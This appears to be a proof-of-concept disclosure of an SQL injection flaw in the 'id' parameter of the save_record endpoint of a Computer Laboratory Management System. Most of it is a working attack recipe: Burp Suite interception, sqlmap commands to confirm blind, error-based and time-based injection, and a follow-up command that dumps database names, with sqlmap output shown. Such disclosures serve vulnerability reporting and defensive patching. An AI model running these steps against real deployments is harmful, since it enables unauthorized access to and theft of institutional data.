---
slug: computer-laboratory-management-system-save_record
title: Computer Laboratory Management System (save_record)
---

## Details

### Related Code file: 
`/lms/classes/Master.php?f=save_record`

## Injection parameter: 
`MULTIPART id`

&nbsp;

## POC

![1](https://github.com/user-attachments/assets/f170b224-fe0c-445f-88da-f0f549a37e33)

Intercept the request using Burpsuite Proxy.

![2](https://github.com/user-attachments/assets/de600ed2-06b9-4d1b-b41e-a514a7c0574a)

Save the request to `save_record.txt`


### Verify vulnerability

```
sqlmap -r save_record.txt --batch
```

![56](https://github.com/user-attachments/assets/49fd9ba6-b04c-44a3-8e98-a6437b00baa3)

![57](https://github.com/user-attachments/assets/23be3f53-a769-4459-a5e0-daa09eba7238)

![58](https://github.com/user-attachments/assets/e820e99b-784a-497d-bbaf-d06c01780a47)

```
Parameter: MULTIPART id ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: -----------------------------20097612161463129383887948722
Content-Disposition: form-data; name="id"


    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: -----------------------------20097612161463129383887948722
Content-Disposition: form-data; name="id"


    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: -----------------------------20097612161463129383887948722
Content-Disposition: form-data; name="id"
```

### Dump databases;

```
sqlmap -r save_record.txt --batch --dbs
```

![55](https://github.com/user-attachments/assets/c8b1e65a-9364-40cd-b14f-9ed3b170fb0e)

```
[02:45:07] [INFO] fetching database names
[02:45:07] [INFO] retrieved: 'information_schema'
[02:45:07] [INFO] retrieved: 'lms'
available databases [2]:
[*] information_schema
[*] lms
```